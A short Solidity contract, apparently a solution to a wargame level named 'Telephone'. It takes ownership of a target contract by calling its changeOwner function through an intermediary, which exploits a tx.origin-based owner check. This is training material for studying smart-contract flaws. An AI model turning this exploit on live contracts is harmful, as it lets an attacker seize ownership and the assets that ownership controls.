// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    function hack(address _telephoneAddress) public {
        ITelephone(_telephoneAddress).changeOwner(msg.sender);
    }
}